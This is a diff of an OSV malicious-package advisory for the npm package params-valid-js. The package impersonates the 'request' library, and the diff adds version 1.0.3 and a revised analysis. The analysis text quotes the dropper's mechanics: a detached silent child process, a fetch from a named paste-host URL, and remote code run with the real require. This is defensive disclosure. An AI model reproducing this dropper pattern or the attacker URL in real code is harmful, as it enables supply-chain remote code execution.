@@ -1,10 +1,10 @@
 {
-  "modified": "2026-06-17T04:22:54Z",
+  "modified": "2026-06-18T19:21:58Z",
   "published": "2026-06-17T04:22:54Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-5988",
   "summary": "Malicious code in params-valid-js (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (4f0f4f5cc684f7bf7b40af2f6856c7d5865f57c7492da68af6c1c194741a4629)\nparams-valid-js impersonates the well-known `request` package (copies Mikeal Rogers' Apache-2.0 header, points bugs URL to github.com/request/request/issues, replicates request's API surface) while shipping a remote-code dropper. index.js exports a function shaped like Express middleware (`(req,res,next)=\u003enext()`) as `module.exports`, `default`, and `reqValidator`. When invoked, the middleware calls `swapJson(...)` which spawns `node lib/callers.js` with `{ detached: true, stdio: 'ignore' }` and `child.unref()` — concealing all output. lib/callers.js then performs `axios.get('https://www.jsonkeeper.com/b/5IZTJ')`, extracts `data.Cookie`, and executes the response body with `new Function.constructor('require', s); handler(require);`, passing the real `require` into the fetched code. jsonkeeper.com is an anonymous, mutable public paste host, so the attacker can swap in arbitrary Node-privileged payloads at any time. Any application that wires this lookalike into its HTTP stack triggers arbitrary remote code execution on the host.\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (397af72237ba3626ac4727497662530f602c2ce6ec71406f48b508055687366c)\nThe package presents itself as 'Simplified HTTP request client' and copies identity metadata from Mikeal Rogers' legitimate `request` package (bugs URL `http://github.com/request/request/issues`, copied copyright header), but its only effective behavior is to launch a remote-code-execution dropper. The default export in `index.js` is a `middleware` function whose sole action is to spawn `node lib/callers.js` as a detached child with `stdio: 'ignore'` and `child.unref()`, allowing the dropper to continue running after the parent exits. `lib/callers.js` shadows `process` with a local object (`const process = { env: { DEV_API_KEY: 'google.com', DEV_SECRET_KEY: 'x-secret-key', DEV_SECRET_VALUE: '_' } }`) so what looks like environment configuration is actually a hardcoded fetch target. The script then performs `axios.get(src, { headers: { [k]: v } })`, reads `response.data.Cookie`, passes it to `new Function.constructor('require', s)`, and immediately invokes the resulting function with the real `require` — executing whatever Node code the server returns with full module access. The combination of name/identity impersonation, detached background execution, environment-shadowing obfuscation, and unpinned remote-eval is a clear supply-chain attack: any consumer that loads this package and invokes the middleware export executes attacker-controlled code.\n",
   "affected": [
     {
       "package": {
@@ -12,10 +12,16 @@
         "name": "params-valid-js"
       },
       "versions": [
-        "1.0.0"
+        "1.0.0",
+        "1.0.3"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -57,6 +63,10 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/params-valid-js/v/1.0.0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/params-valid-js/v/1.0.3"
     }
   ],
   "credits": [
@@ -71,13 +81,23 @@
   "database_specific": {
     "malicious-packages-origins": [
       {
-        "id": "IN-MAL-2026-006882",
-        "import_time": "2026-06-17T05:45:42.075763795Z",
-        "modified_time": "2026-06-17T04:22:54Z",
-        "sha256": "4f0f4f5cc684f7bf7b40af2f6856c7d5865f57c7492da68af6c1c194741a4629",
         "source": "amazon-inspector",
+        "sha256": "4f0f4f5cc684f7bf7b40af2f6856c7d5865f57c7492da68af6c1c194741a4629",
+        "import_time": "2026-06-17T05:45:42.075763795Z",
+        "id": "IN-MAL-2026-006882",
+        "modified_time": "2026-06-17T04:22:54Z",
         "versions": [
           "1.0.0"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "397af72237ba3626ac4727497662530f602c2ce6ec71406f48b508055687366c",
+        "import_time": "2026-06-18T19:20:03.356634194Z",
+        "id": "IN-MAL-2026-007028",
+        "modified_time": "2026-06-18T19:11:16Z",
+        "versions": [
+          "1.0.3"
         ]
       }
     ]
